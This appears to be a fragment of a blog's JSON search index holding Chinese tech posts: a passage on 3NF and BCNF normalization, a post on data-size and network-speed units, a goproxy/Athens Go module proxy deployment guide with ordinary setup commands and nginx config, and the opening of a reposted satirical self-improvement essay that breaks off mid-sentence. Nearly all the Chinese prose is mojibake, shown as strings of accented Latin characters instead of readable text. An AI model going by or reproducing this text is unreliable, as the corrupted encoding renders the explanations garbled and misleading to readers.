å®šä¹‰\n\nå¦‚æœå…³ç³»æ¨¡å¼Ræ˜¯2NFï¼Œä¸”å…³ç³»æ¨¡å¼Rï¼ˆU,Fï¼‰ä¸­çš„æ‰€æœ‰éä¸»å±æ€§å¯¹ä»»ä½•å€™é€‰å…³é”®å­—éƒ½ä¸å­˜åœ¨ä¼ é€’ä¾èµ–ï¼Œåˆ™ç§°å…³ç³»Ræ˜¯å±äºç¬¬ä¸‰èŒƒå¼ã€‚\n\nç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ï¼›ç¬¦åˆ2NFï¼Œå¹¶ä¸”ï¼Œæ¶ˆé™¤ä¼ é€’ä¾èµ–ã€‚\n\n\n\n## 3.4 BCNF\n#### 3.4.1 3NF ä¹Ÿä¼šæœ‰ä¸€äº›é—®é¢˜\n\n1. æŸå…¬å¸æœ‰è‹¥å¹²ä¸ªä»“åº“ï¼›\n2. æ¯ä¸ªä»“åº“åªèƒ½æœ‰ä¸€åç®¡ç†å‘˜ï¼Œä¸€åç®¡ç†å‘˜åªèƒ½åœ¨ä¸€ä¸ªä»“åº“ä¸­å·¥ä½œï¼›\n3. ä¸€ä¸ªä»“åº“ä¸­å¯ä»¥å­˜æ”¾å¤šç§ç‰©å“ï¼Œä¸€ç§ç‰©å“ä¹Ÿå¯ä»¥å­˜æ”¾åœ¨ä¸åŒçš„ä»“åº“ä¸­ã€‚æ¯ç§ç‰©å“åœ¨æ¯ä¸ªä»“åº“ä¸­éƒ½æœ‰å¯¹åº”çš„æ•°é‡ã€‚\n\né‚£ä¹ˆå…³ç³»æ¨¡å¼ ä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰ å±äºå“ªä¸€çº§èŒƒå¼ï¼Ÿ\n\nå·²çŸ¥å‡½æ•°ä¾èµ–é›†ï¼šä»“åº“å â†’ ç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜ â†’ ä»“åº“åï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰â†’ æ•°é‡\nç ï¼šï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ï¼Œï¼ˆä»“åº“åï¼Œç‰©å“åï¼‰\nä¸»å±æ€§ï¼šä»“åº“åã€ç®¡ç†å‘˜ã€ç‰©å“å\néä¸»å±æ€§ï¼šæ•°é‡\n\nâˆµ ä¸å­˜åœ¨éä¸»å±æ€§å¯¹ç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–å’Œä¼ é€’å‡½æ•°ä¾èµ–ã€‚âˆ´ æ­¤å…³ç³»æ¨¡å¼å±äº3NFã€‚\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/9.png)\n\nå¥½ï¼Œæ—¢ç„¶æ­¤å…³ç³»æ¨¡å¼å·²ç»å±äºäº† 3NFï¼Œé‚£ä¹ˆè¿™ä¸ªå…³ç³»æ¨¡å¼æ˜¯å¦å­˜åœ¨é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä»¥ä¸‹å‡ ç§æ“ä½œï¼š\n\n1. å…ˆæ–°å¢åŠ ä¸€ä¸ªä»“åº“ï¼Œä½†å°šæœªå­˜æ”¾ä»»ä½•ç‰©å“ï¼Œæ˜¯å¦å¯ä»¥ä¸ºè¯¥ä»“åº“æŒ‡æ´¾ç®¡ç†å‘˜ï¼Ÿâ€”â€”ä¸å¯ä»¥ï¼Œå› ä¸ºç‰©å“åä¹Ÿæ˜¯ä¸»å±æ€§ï¼Œæ ¹æ®å®ä½“å®Œæ•´æ€§çš„è¦æ±‚ï¼Œä¸»å±æ€§ä¸èƒ½ä¸ºç©ºã€‚\n2. æŸä»“åº“è¢«æ¸…ç©ºåï¼Œéœ€è¦åˆ é™¤æ‰€æœ‰ä¸è¿™ä¸ªä»“åº“ç›¸å…³çš„ç‰©å“å­˜æ”¾è®°å½•ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”ä»“åº“æœ¬èº«ä¸ç®¡ç†å‘˜çš„ä¿¡æ¯ä¹Ÿè¢«éšä¹‹åˆ é™¤äº†ã€‚\n3. å¦‚æœæŸä»“åº“æ›´æ¢äº†ç®¡ç†å‘˜ï¼Œä¼šå¸¦æ¥ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€”â€”è¿™ä¸ªä»“åº“æœ‰å‡ æ¡ç‰©å“å­˜æ”¾è®°å½•ï¼Œå°±è¦ä¿®æ”¹å¤šå°‘æ¬¡ç®¡ç†å‘˜ä¿¡æ¯ã€‚\n\nä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå³ä½¿å…³ç³»æ¨¡å¼ç¬¦åˆ 3NF çš„è¦æ±‚ï¼Œä»ç„¶å­˜åœ¨ç€æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜ï¼Œä»ç„¶ä¸æ˜¯ â€å¥½â€œ çš„è®¾è®¡ã€‚\n\n\n\n#### 3.3.2  æ‹†è¡¨ç¬¦åˆBCNF\n\né€ æˆæ­¤é—®é¢˜çš„åŸå› ï¼šå­˜åœ¨ç€**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\nï¼ˆåœ¨æ­¤ä¾‹ä¸­å°±æ˜¯å­˜åœ¨ä¸»å±æ€§ã€ä»“åº“åã€‘å¯¹äºç ã€ï¼ˆç®¡ç†å‘˜ï¼Œç‰©å“åï¼‰ã€‘çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n\nè§£å†³åŠæ³•å°±æ˜¯è¦åœ¨ 3NF çš„åŸºç¡€ä¸Šæ¶ˆé™¤**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\n\n\nä»“åº“ï¼ˆä»“åº“åï¼Œç®¡ç†å‘˜ï¼‰\nåº“å­˜ï¼ˆä»“åº“åï¼Œç‰©å“åï¼Œæ•°é‡ï¼‰\n\nè¿™æ ·ï¼Œä¹‹å‰çš„æ’å…¥å¼‚å¸¸ï¼Œä¿®æ”¹å¼‚å¸¸ä¸åˆ é™¤å¼‚å¸¸çš„é—®é¢˜å°±è¢«è§£å†³äº†ã€‚\n\n\n\n#### 3.4.3 å®šä¹‰\n\nç¬¦åˆ3NFï¼Œå¹¶ä¸”ï¼Œä¸»å±æ€§ä¸ä¾èµ–äºä¸»å±æ€§ã€‚è‹¥å…³ç³»æ¨¡å¼Rå±äºç¬¬ä¸€èŒƒå¼ï¼Œä¸”æ¯ä¸ªå±æ€§éƒ½ä¸ä¼ é€’ä¾èµ–äºé”®ç ï¼Œåˆ™Rå±äºBCèŒƒå¼ã€‚\n\n\n\n## 3.5 æ€»ç»“\n\nåº”ç”¨çš„èŒƒå¼è¶Šé«˜ï¼Œåˆ™è¡¨è¶Šå¤šã€‚è¡¨å¤šä¼šå¸¦æ¥å¾ˆå¤šé—®é¢˜ï¼š1 æŸ¥è¯¢æ—¶è¦è¿æ¥å¤šä¸ªè¡¨ï¼Œå¢åŠ äº†æŸ¥è¯¢çš„å¤æ‚åº¦. 2 æŸ¥è¯¢æ—¶éœ€è¦è¿æ¥å¤šä¸ªè¡¨ï¼Œé™ä½äº†æ•°æ®åº“æŸ¥è¯¢æ€§èƒ½\n\næ‰€ä»¥æœ‰çš„æ—¶å€™éœ€è¦åº”ç”¨åèŒƒå¼åŒ–\n\n+ 2NFåœ¨1NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†**éä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n+ 3NFåœ¨2NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†**éä¸»å±æ€§**å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n+ BCNF åœ¨3NFçš„åŸºç¡€ä¸Šï¼Œæ¶ˆé™¤**ä¸»å±æ€§**å¯¹äºç çš„éƒ¨åˆ†ä¸ä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n\n\n\n# 4. å¤´è„‘é£æš´\n\n+ 1NF, æ•°æ®åº“é»˜è®¤å°±æ˜¯, ä¸ç”¨è€ƒè™‘\n+ 2NF  ç å¯ä»¥å†³å®šä¸€åˆ‡, ä½†æ˜¯ä¸èƒ½ä¸€éƒ¨åˆ†å°±å†³å®š.  (AB->CD) ä½†æ˜¯ (A->C)    ä¸èƒ½è¿™æ ·, è¦æ”¹\n+ 3NF  ç å¯ä»¥å†³å®šä¸€åˆ‡, ä½†æ˜¯ä¸èƒ½é—´æ¥å†³å®š.          (A->B->C)  ä¸èƒ½è¿™æ ·, è¦æ”¹\n+ BCNF ç è‡ªå·±çš„ä¸»å±æ€§ç›¸äº’ä¾èµ–,å…ˆè§£å†³è‡ªå·±çš„ä¾èµ–æˆä¸º BCNF       (AB->CD)   ä½†æ˜¯ (A->B) , è¦æ”¹\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/24696366/answer/29189700\n+ https://www.cnblogs.com/rosesmall/p/9585655.html","tags":["sql"],"categories":["sql"]},{"title":"æ–‡ä»¶å¤§å°å’Œç½‘é€Ÿçš„å•ä½","url":"%2Fp%2F3160c079.html","content":"\n\n\n### 1. æ¯”ç‰¹\n\nè®¡ç®—æœºå‘å‡ºçš„ä¿¡å·éƒ½æ˜¯æ•°å­—å½¢å¼çš„, æ¯”ç‰¹(bit)æ¥æºäº `binary digit`, æ„æ€æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°å­—. å› æ­¤ä¸€ä¸ªæ¯”ç‰¹å°±æ˜¯äºŒè¿›åˆ¶æ•°å­—ä¸­çš„ä¸€ä¸ª1 æˆ– 0.\n\n<!-- more -->\n\n### 2. ç½‘ç»œé€Ÿç‡(1000)\n\né€Ÿç‡æ˜¯è®¡ç®—æœºç½‘ç»œä¸­æœ€é‡è¦çš„ä¸€ä¸ªæ€§èƒ½æŒ‡æ ‡,  é€Ÿç‡çš„å•ä½æ˜¯ `bit/s` | `b/s` |` bps`  (æ¯”ç‰¹æ¯ç§’)\n\n+ k = 10çš„3æ¬¡æ–¹  (kbit/s)\n\n+ M = 10çš„6æ¬¡æ–¹ (Mbit/s)\n+ G = 10çš„9æ¬¡æ–¹\n+ T = 10çš„12æ¬¡æ–¹\n+ .......(1000å•ä½)\n\n\n\n### 3. è®¡ç®—æœºå­˜å‚¨(1024*8)\n\nè®¡ç®—æœºçš„æ•°æ®é‡å¸¸å¸¸ç”¨ B ä½œä¸ºåº¦é‡çš„å•ä½(Bä»£è¡¨byte), é€šå¸¸ä¸€ä¸ªå­—èŠ‚ä»£è¡¨8ä¸ªæ¯”ç‰¹.\n\n+ K = 2çš„10æ¬¡æ–¹\n+ M = 2çš„20æ¬¡æ–¹\n+ G = 2çš„30æ¬¡æ–¹\n+ T = 2çš„40æ¬¡æ–¹\n+ .......(1024å•ä½)\n\n\n\n### 4. æ€»ç»“\n\n\n\n##### 4.1 è®¡ç®—\n\n> 15Gçš„æ•°æ®å—ä»¥10G çš„é€Ÿç‡ä¼ é€, éœ€è¦å¤šå°‘æ—¶é—´? \n\nè¡¨æ˜æœ‰ 15 * 2çš„30æ¬¡æ–¹ * 8 `æ¯”ç‰¹`çš„æ•°æ®å—ä»¥ 10 * 10çš„9æ¬¡æ–¹ `b/s` çš„é€Ÿç‡ä¼ é€, ä¸¤ä¸ªç›¸é™¤å°±æ˜¯æ—¶é—´\n\n\n\n##### 4.2 åŒºåˆ†\n\n+ åœ¨è®¡ç®—æœºé¢†åŸŸä¸­, æ‰€æœ‰çš„å•ä½éƒ½ä½¿ç”¨å¤§å†™å­—æ¯(K, M, G....)\n+ åœ¨é€šä¿¡é¢†åŸŸä¸­, åªæœ‰1000ä½¿ç”¨ k, å…¶ä½™çš„éƒ½ç”¨å¤§å†™(M, G....)\n+ æœ‰çš„ä¸ä¸¥æ ¼åŒºåˆ†, å¤§å†™çš„ K å³å¯ä»¥è¡¨ç¤º1000, ä¹Ÿå¯ä»¥è¡¨ç¤º1024\n\n \n\n##### 4.3 ç”Ÿæ´»å¸¸è¯†\n\næˆ‘ä»¬è¯´çš„å‡ Må¸¦å®½æ˜¯ä»¥æ¯”ç‰¹ä¸ºå•ä½çš„ï¼Œè€Œæˆ‘ä»¬å¸¸çœ‹åˆ°çš„ä¸‹è½½é€Ÿåº¦æ˜¾ç¤ºçš„å‡ KBæ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½\n\n100Mçš„ç½‘çš„è¯ç†è®ºä¸‹è½½é€Ÿåº¦:\n\n100Ã—1000Ã—1000ï¼100000000ä½ï¼Œå› ä¸º8ä¸ªä½ç­‰äº1ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¿™ä¸ªé€Ÿåº¦æ¯ç§’å¯ä¸‹è½½\n\n100000000ä½Ã·8=12500000å­—èŠ‚ï¼Œè€Œ1024å­—èŠ‚ï¼1Kå­—èŠ‚ï¼Œæ‰€ä»¥æ¢ç®—ç»“æœï¼š\n\n12500000å­—èŠ‚Ã·1024â‰ˆ12207.03Kå­—èŠ‚ï¼Œ1024Kå­—èŠ‚å°±ç­‰äº1Må­—èŠ‚ï¼Œæ¢ç®—ç»“æœï¼š\n\n12207.03Kå­—èŠ‚Ã·1024â‰ˆ11.92M\n\n\n\næœ‰çš„è®¡ç®—æ–¹å¼æ˜¯ç›´æ¥é™¤ä»¥8, æ˜¯12.5M\n\n\n\n### 5. å‚è€ƒèµ„æ–™ \n\n+ è®¡ç®—æœºç½‘ç»œç¬¬7ç‰ˆ(è°¢å¸Œä»)","tags":["å•ä½"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"goproxyçš„éƒ¨ç½²å®è·µ","url":"%2Fp%2F74b41bb2.html","content":"\n### 0. å‰è¨€\n\nåœ¨å¤§é™†åœ°åŒºæˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡ `go get` å‘½ä»¤è·å–åˆ°ä¸€äº›ç¬¬ä¸‰æ–¹åŒ…ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ `golang.org/x` ä¸‹é¢çš„å„ç§ä¼˜ç§€çš„åŒ…. è§£å†³æ–¹æ¡ˆå¦‚ä¸‹:\n\n```bash\n# go.1.12.x\nexport GO111MODULE=on\nexport GOPROXY=https://goproxy.cn\n\n# go1.13.x\ngo env -w GOPROXY=https://goproxy.cn,direct\ngo env -w GOPRIVATE=*.corp.example.com \n\n#GOPRIVATE=*.corp.example.com è¡¨ç¤ºæ‰€æœ‰æ¨¡å—è·¯å¾„ä»¥ corp.example.com çš„ä¸‹ä¸€çº§åŸŸå (å¦‚ team1.corp.example.com) ä¸ºå‰ç¼€çš„æ¨¡å—ç‰ˆæœ¬éƒ½å°†ä¸ç»è¿‡ Go module proxy å’Œ Go checksum databaseï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸åŒ…æ‹¬ corp.example.com æœ¬èº«ã€‚\n```\n\n<!-- more -->\n\n\n\næœ¬æ–‡å°†é‡ç‚¹ä»‹ç» go module çš„ proxy é…ç½®å®ç°ï¼ŒåŒ…æ‹¬å¦‚ä¸‹ä¸¤ç§çš„ä»£ç†é…ç½®ï¼š\n\n- GOPROXY\n- Athens\n\n### 1.  goproxy\n\nhttps://github.com/goproxyio/goproxy\n\n\n\n##### 1.1 å®‰è£…go\n\n```bash\nwget https://dl.google.com/go/go1.13.4.linux-amd64.tar.gz #ä¸‹è½½go\nsudo tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz # è§£å‹åˆ°/usr/local\nexport PATH=$PATH:/usr/local/go/bin # è®¾ç½®ç¯å¢ƒå˜é‡\ngo version # go version go1.13.4 linux/amd64\n```\n\n\n\n##### 1.2 å®‰è£…goproxy\n\n```bash\ngit clone https://github.com/goproxyio/goproxy.git\ncd goproxy/\nmake\n```\n\n\n\n##### 1.3 ä»£ç†\n\n```bash\n# æœåŠ¡ç«¯æ‰§è¡Œ\n./bin/goproxy -cacheDir=/tmp/test -listen=0.0.0.0:8082 \n\n\n# å®¢æˆ·ç«¯æ“ä½œ\nGOPROXY=http://æœåŠ¡ç«¯ip:8082 go get -v github.com/spf13/cobra # ä¼šç¼“å­˜åœ¨æœåŠ¡ç«¯/tmp/testç›®å½•ä¸‹\n```\n\n\n\n##### 1.4 nginxé…ç½®\n\n```nginx\n./bin/goproxy -cacheDir=/tmp/test -listen :8082 -proxy https://goproxy.cn -exclude liuvv.com\n\n\nserver {\n    server_name goproxy.liuvv.com;\n    listen 80 ;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/goproxy_access_log;\n    error_log /var/log/nginx/goproxy_error_log notice;\n\n    location  / {\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_connect_timeout 300s;\n        proxy_send_timeout 300s;\n        proxy_read_timeout 300s;\n\n        proxy_pass             http://127.0.0.1:8082;\n    }\n}\n```\n\n\n\n### 2.  Athens\n\nhttps://github.com/gomods/athens\n\n\n\n```bash\ngit clone https://github.com/gomods/athens \ncd athens \n\nmake build-ver VERSION=\"0.7.0\" # å¦‚æœä¸‹è½½ä¸ä¸‹æ¥, ä¿®æ”¹makefileçš„goproxy\n./athens -version\n```\n\n\n\næœåŠ¡å™¨å¯åŠ¨\n\n```bash\nexport ATHENS_STORAGE_TYPE=disk  # ç¼“å­˜åˆ°ç¡¬ç›˜\nexport ATHENS_DISK_STORAGE_ROOT=~/athens-storage\n./athens\n```\n\n\n\nå®¢æˆ·ç«¯æµ‹è¯•\n\n```bash\nexport GO111MODULE=on export GOPROXY=http:#æœåŠ¡å™¨ip:3000\n\n\ngit clone https://github.com/athens-artifacts/walkthrough.git \ncd walkthrough\ngo run .  # ä¼šç¼“å­˜åœ¨æœåŠ¡ç«¯~/athens-storageç›®å½•ä¸‹\n\n\ncurl æœåŠ¡å™¨ip:3000/github.com/athens-artifacts/samplelib/@v/list\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ [Helloï¼ŒGo module proxy](https://tonybai.com/2018/11/26/hello-go-module-proxy/)\n+ [Go Module Proxy](https://juejin.im/post/5c8f9f8ef265da612c3a34b9)\n+ https://blog.wolfogre.com/posts/golang-package-history/\n+ https://juejin.im/post/5d8ee2db6fb9a04e0b0d9c8b\n+ https://github.com/goproxy/goproxy.cn/","tags":["golang"],"categories":["golang"]},{"title":"ã€è½¬è½½ã€‘å¦‚ä½•è¶…è¿‡å¤§å¤šæ•°äºº","url":"%2Fp%2F48fcb916.html","content":"\n\n\nå½“ä½ çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„æ ‡é¢˜ï¼Œä½ ä¸€å®šå¯¹è¿™ç¯‡æ–‡ç« äº§ç”Ÿäº†å·¨å¤§çš„å…´è¶£ï¼Œå› ä¸ºä½ çš„æ½œæ„è¯†åœ¨å‘Šè¯‰ä½ ï¼Œè¿™æ˜¯ä¸€æœ¬äººç”Ÿçš„â€œæ­¦æ—ç§˜ç±â€ï¼Œè€Œä¸”è¿˜æ˜¯å·¦è€³æœµå†™çš„ï¼Œä¸€å®šæœ‰å¹²è´§æ»¡æ»¡ï¼Œåªè¦è¯»å®Œï¼Œä¸€å®šå¯ä»¥ç»ƒå°±ç¥åŠŸå¹¶æ‰¾åˆ°è¶…è¿‡å¤§å¤šæ•°äººçš„å¿«è½¦é“å’Œæ·å¾„â€¦â€¦ç„¶è€Œâ€¦â€¦ å½“ä½ çœ‹åˆ°æˆ‘è¿™æ ·å¼€ç¯‡æ—¶ï¼Œä½ ä¸€å®šä¼šè§‰å¾—æˆ‘é©¬ä¸Šå°±è¦æœ‰ä¸ªè½¬æŠ˜ï¼Œå‘Šè¯‰ä½ è¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä¸€åˆ‡éƒ½éœ€è¦ä»˜å‡ºå’ŒåŠªåŠ›â€¦â€¦ç„¶è€Œï¼Œä½ é”™äº†ï¼Œè¿™ç¯‡æ–‡ç« è¿˜çœŸå°±æ˜¯ä¸€ç¯‡â€œç§˜ç±â€ï¼Œåªè¦ä½ æŠŠè¿™äº›â€œç§˜ç±â€ç”¨èµ·æ¥ï¼Œä½ å°±ä¸€å®šå¯ä»¥è¶…è¿‡å¤§å¤šæ•°äººã€‚è€Œä¸”ï¼Œè¿™ç¯‡æ–‡ç« åªæœ‰æˆ‘è¿™ä¸ªâ€œäººç”Ÿå¯¼å¸ˆâ€å¯ä»¥å†™å¾—å¥½ã€‚æ¯•ç«Ÿï¼Œæˆ‘çš„ç”Ÿå‘½è¿‡åˆ°äº†åå…­è¿›åˆ¶2Bçš„å¹´çºªï¼Œè¸å…¥è¿™ä¸ªç¤¾ä¼šå·²è¶…è¿‡20å¹´ï¼Œèˆæˆ‘å…¶è°å‘¢ï¼Ÿï¼\n\nP.S. è¿™ç¯‡æ–‡ç« å€Ÿé‰´äºã€Š[å¦‚ä½•å†™å‡ºæ— æ³•ç»´æŠ¤çš„ä»£ç ](https://coolshell.cn/articles/4758.html)ã€‹ä¸€æ–‡çš„é£æ ¼â€¦â€¦å˜¿å˜¿\n\n<!-- more -->\n\n\n\n### 1. ç›¸å…³æŠ€å·§å’Œæœ€ä½³å®è·µ\n\nè¦è¶…è¿‡åˆ«äººå…¶å®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°¤å…¶åœ¨ä»Šå¤©çš„ä¸­å›½ï¼Œæ›´æ˜¯ç®€å•ã€‚å› ä¸ºï¼Œä½ åªçœ‹çœ‹ä¸­å›½çš„äº’è”ç½‘ï¼Œä½ å°±ä¼šå‘ç°ï¼Œä»–ä»¬åŸºæœ¬ä¸Šå…¨éƒ¨éƒ½æ˜¯åœ¨æ¶ˆè´¹å¤§ä¼—ï¼Œè®©å¤§ä¼—å˜å¾—æ›´ä¸ºåœ°æ„šè ¢å’Œå‚»ç“œã€‚**æ‰€ä»¥ï¼Œåœ¨ä»Šå¤©çš„ä¸­å›½ï¼Œä½ åŸºæœ¬ä¸Šä¸ç”¨åšä»€ä¹ˆï¼Œåªéœ€è¦ä¸ä½¿ç”¨ä¸­å›½äº’è”ç½‘ï¼Œä½ å°±å¾ˆè‡ªç„¶åœ°è¶…è¿‡å¤§å¤šæ•°äººäº†**ã€‚å½“ç„¶ï¼Œå¦‚æœä½ è¿˜æƒ³è·Ÿä»–ä»¬å½»åº•æ‹‰å¼€ï¼Œç”©ä»–ä»¬å‡ ä¸ªèº«ä½ï¼ŒæŠŠåˆ«äººæ‰“åˆ°åº•å±‚ï¼Œä¸‹é¢çš„è¿™äº›â€œæŠ€å·§â€ä½ è¦å¤šå¤šäº†è§£ä¸€ä¸‹ã€‚\n\nåœ¨ä¿¡æ¯è·å–ä¸Šï¼Œä½ è¦ä¸æ–­åœ°å‘å¤§ä¼—é¼“å¹ä¸‹é¢çš„è¿™äº›äº‹ï¼š\n\n- è®©å¤§å®¶éƒ½ç”¨ç™¾åº¦æœç´¢å¼•æ“æŸ¥æ‰¾ä¿¡æ¯ï¼Œè®¢é˜…å¾®ä¿¡å…¬ä¼—å·æˆ–æ˜¯åˆ°çŸ¥ä¹ä¸Šå­¦ä¹ çŸ¥è¯†â€¦â€¦è¦åšåˆ°è¿™ä¸€æ­¥ï¼Œä½ å°±éœ€è¦æŠŠâ€œç™¾åº¦ä¸€ä¸‹â€æŒ‚åœ¨å˜´è¾¹ï¼Œç„¶åè¦ç»å¸¸åœ¨ç¾¤æˆ–æœ‹å‹åœˆä¸­è½¬å‘å¾®ä¿¡å…¬ä¼—å·çš„æ–‡ç« ï¼Œå¹¶ä¸”è½¬å‘çŸ¥ä¹é‡Œçš„å„ç§â€œå¦‚ä½•çœ‹å¾…â€¦â€¦â€è¿™æ ·çš„æ–‡ç« ï¼Œè®©ä»–ä»¬**çˆ±ä¸Šå…«å¦**ï¼Œ**çˆ±ä¸Šè½¬å‘**ï¼Œ**çˆ±ä¸Šç¢ç‰‡**ã€‚\n- è®©å¤§å®¶åˆ°å¾®åšæˆ–æ˜¯çŸ¥è¯†æ˜Ÿçƒä¸Šç²‰ä¸€äº›å¤§å’–ï¼Œå¯†åˆ‡å…³æ³¨ä»–ä»¬çš„è¨€è®ºå’ŒåŠ¨å‘â€¦â€¦æ˜¯çš„ï¼Œå‘Šè¯‰å¤§å®¶ï¼Œå¤§å’–çš„ä»»ä½•æƒ³æ³•ä¸€è¨€ä¸€è¡Œéƒ½å¯ä»¥åœ¨å¾®åšã€æœ‹å‹åœˆæˆ–æ˜¯çŸ¥è¯†æ˜Ÿçƒä¸Šè·å¾—ï¼Œè®©å¤§å®¶ç›¸ä¿¡ï¼Œä½ çš„æˆé•¿å’Œå¤§å’–çš„è§é—»å’Œé—²æ‰¯éå¸¸æœ‰å…³ç³»ï¼Œä½ è·Ÿç‰›äººåœ¨ä¸€ä¸ªåœˆå­é‡Œä½ ä¹Ÿä¼šå˜ç‰›ã€‚\n- æŠŠä»Šæ—¥å¤´æ¡å’ŒæŠ–éŸ³è¿™æ ·çš„APPæ¨èç»™å¤§å®¶â€¦â€¦ä½ åªéœ€è¦è®©ä½ æœ‰æœ‹å‹æˆåŠŸåœ°å®‰è£…è¿™ä¸¤ä¸ªAPPï¼Œä»–ä»¬å°±ä¼šèŠ±å¤§é‡çš„æ—¶é—´åœ¨ä¸Šé¢ï¼Œè€Œä¸èƒ½è‡ªæ‹”ï¼Œè¦è®©ä»–ä»¬å®‰è£…å…¶å®è¿˜æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½ è¦ä¸ä¿¡ä½ å°±è£…ä¸€ä¸ªè¯•ç©ä¸€ä¼šçœ‹çœ‹ï¼ˆå˜¿å˜¿å˜¿ï¼‰ã€‚\n- è®©å¤§å®¶çƒ­çˆ±å…«å¦ï¼Œå…«å¦å¹¶ä¸ä¸€å®šæ˜¯æ˜æ˜Ÿçš„å…«å¦ï¼Œè¿˜å¯ä»¥æ˜¯ä½ èº«è¾¹çš„äººï¼Œæ¯”å¦‚ï¼Œå…¬å¸çš„åŒäº‹ï¼Œè‡ªå·±çš„åŒå­¦ï¼ŒèŒåœºè§é—»ï¼Œç¤¾ä¼šçƒ­ç‚¹ï¼Œäº‰è®®è¯é¢˜ï¼Œâ€¦â€¦**è¿™äº›ä¸œè¥¿æ€»æœ‰ä¸€äº›ä¸œè¥¿ä¼šè®©äººå¿ƒæ€æœ‰å¾ˆå¤šå¾®å¦™çš„å˜åŒ–ï¼Œç”šè‡³èŠ±å¤§é‡çš„æ—¶é—´å»æœç´¢å’Œé˜…è¯»å¤§é‡çš„è§‚ç‚¹ï¼Œä»¥åŠèŠ±å¤§é‡æ—¶é—´ä¸äººè¾©è®ºäº‰è®ºï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šè®©äººä¸Šç˜¾ï¼Œè®©äººæ¬²ç½¢ä¸èƒ½ï¼Œç„¶è€Œè¿™äº›äº‹å´å’Œè‡ªå·±æ²¡æœ‰åŠæ¯›é’±å…³ç³»ã€‚ä½ è¦åšçš„äº‹å°±æ˜¯è½¬å‘å…¶ä¸­ä¸€äº›SBæˆ–æ˜¯å¾ˆæç«¯çš„è§‚ç‚¹ï¼Œé€ æˆå¤§å®¶çš„ä¸€ç¦è®¨è®ºåï¼Œå°±æ—©æ—©ç¦»åœºâ€¦â€¦**\n- åˆ©ç”¨çˆ±å›½ä¸»ä¹‰ï¼Œè®©å¤§å®¶è§‰å¾—ä¸ç”¨å­¦è‹±æ–‡ï¼Œä¸è¦å‡ºå›½ï¼Œä¸è¦ç¿»å¢™ï¼Œå’±ä»¬å·²ç»æ˜¯å¼ºå›½äº†â€¦â€¦è¿™ç‚¹å…¶å®è¿˜æ˜¯å¾ˆå®¹æ˜“åšåˆ°çš„ï¼Œå› ä¸ºå­¦ä¹ æ˜¯æ¯”è¾ƒé€†äººæ€§çš„ï¼Œæ‰€ä»¥ï¼Œåªè¦ä½ é¼“å¹é‚£äº›è‹±æ–‡æ— ç”¨è®ºï¼Œå‡ºå›½æ´»å¾—æ›´æƒ¨ï¼Œå›½å®¶å’Œæ°‘æ—éƒ½å˜å¾—å¾ˆå¼ºå¤§ï¼Œå°±ç®—è‡ªå·±è¿‡å¾—å¾ˆåº•å±‚ï¼Œä¹Ÿæœ‰å¤§å›½äººæ°‘çš„æ„Ÿè§‰ã€‚\n\nç„¶åï¼Œåœ¨çŸ¥è¯†å­¦ä¹ å’ŒæŠ€èƒ½è®­ç»ƒä¸Šï¼Œè®©ä»–ä»¬ä¸å¾—è¦é¢†å¹¶äº§ç”Ÿå¹»è§‰\n\n- è®©ä»–ä»¬**æ··æ·†è®¤è¯†å’ŒçŸ¥è¯†**ï¼Œä»¥ä¸ºå¼€é˜”è®¤çŸ¥å°±æ˜¯å­¦ä¹ ï¼Œè®©ä»–ä»¬æœ‰å­¦ä¹ å’Œæˆé•¿çš„å¹»è§‰â€¦â€¦\n- åŸ¹å…»ä»–ä»¬è¦å­¦ä¼šä½¿ç”¨ç¢ç‰‡æ—¶é—´å­¦ä¹ ã€‚**ç­‰ä»–ä»¬ä¹ 